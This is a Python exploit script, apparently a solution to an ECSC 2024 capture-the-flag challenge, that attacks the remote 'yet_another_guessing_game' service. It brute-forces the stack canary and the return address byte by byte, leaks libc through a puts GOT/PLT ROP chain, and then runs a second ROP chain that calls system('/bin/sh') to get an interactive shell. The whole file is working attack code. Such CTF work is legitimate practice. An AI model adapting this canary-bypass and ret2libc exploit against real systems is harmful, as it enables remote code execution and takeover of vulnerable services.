from gdb_plus import *

e = ELF('./yet_another_guessing_game')
dbg = Debugger('./yet_another_guessing_game', script='init-gef').remote('yetanotherguessinggame.challs.open.ecsc2024.it', 38010)

p = dbg.p

dbg.c(wait=False)

INPUT_BUF_LEN = 40
# fill random_bytes + the first character of the canary (always null byte)
payload = b'A' * 16 + b'B'

# leak the canary knowing that the LSB is 0
for i in range(7):
    for b in range(1, 256):
        p.sendafter(b'Guess the secret!\n', payload + bytes([b]) + b'\x00' * (INPUT_BUF_LEN - len(payload) - 1) + payload)
        result = p.recvline()

        p.sendafter(b'(y/n)\n', b'y')

        if b'win' in result:
            log.info(f'Appending {b:02x} to canary')
            payload += bytes([b])
            break
    else:
        log.warn(f'Couldn\'t find a byte value for canary_{i}!')
        exit(-1)

# add the missing null byte to the canary
canary = b'\x00' + payload[17:]
log.info(f'{canary = }')

# old RBP
payload += b'C' * 8

# leak the return address knowing that the two MSBs are 0
for i in range(6):
    for b in range(1, 256):
        p.sendafter(b'Guess the secret!\n', payload + bytes([b]) + b'\x00' * (INPUT_BUF_LEN - len(payload) - 1) + payload)
        result = p.recvline()

        p.sendafter(b'(y/n)\n', b'y')

        if b'win' in result:
            log.info(f'Appending {b:02x} to return address')
            payload += bytes([b])
            break
    else:
        log.warn(f'Couldn\'t find a byte value for ret_{i}!')
        exit(-1)

# add the two missing null bytes to the return address
return_address = u64(payload[-6:] + b'\x00' * 2)
log.info(f'{return_address = :016x}')

e.address = return_address - 0x0000000000000483

log.info(f'Address of binary: {e.address:016x}')

PUTS_GOT = e.address + 12168
PUTS_PLT = e.address + 224
game_addr = e.address + 655

ROP_POP_RDI_RET = e.address + 0x503
ROP_RET = e.address + 0x514

# pop rdi ; ret
rop_chain = p64(ROP_POP_RDI_RET) \
    + p64(PUTS_GOT) \
    + p64(PUTS_PLT) \
    + p64(game_addr)

# execute the first ROP chain - print address of `puts` in libc
p.sendafter(b'Guess the secret!\n', b'A' * 16 + b'\x00' * (INPUT_BUF_LEN - 16) + b'A' * 16 + canary + b'B' * 8 + rop_chain)
p.sendafter(b'(y/n)\n', b'n')
p.recvuntil(b'Goodbye!\n')

# read the address of `puts`, pad it to the left with null bytes and unpack it
puts_addr = u64(p.recvline()[:-1].ljust(8, b'\x00'))

log.info(f'{puts_addr = :016x}')

system_addr = puts_addr - 205200
binsh_addr = puts_addr + 1245597
exit_addr = puts_addr - 252384

# ret ; pop rdi ; ret
# note that the first gadget that's just a `ret` is required for the stack to be 16-byte aligned
rop_chain = p64(ROP_RET) \
    + p64(ROP_POP_RDI_RET) \
    + p64(binsh_addr) \
    + p64(system_addr)

# execute the second ROP chain and enter the interactive mode
p.sendafter(b'Guess the secret!\n', b'A' * 16 + b'\x00' * (INPUT_BUF_LEN - 16) + b'A' * 16 + canary + b'B' * 8 + rop_chain)
p.sendafter(b'(y/n)\n', b'n')
p.interactive()
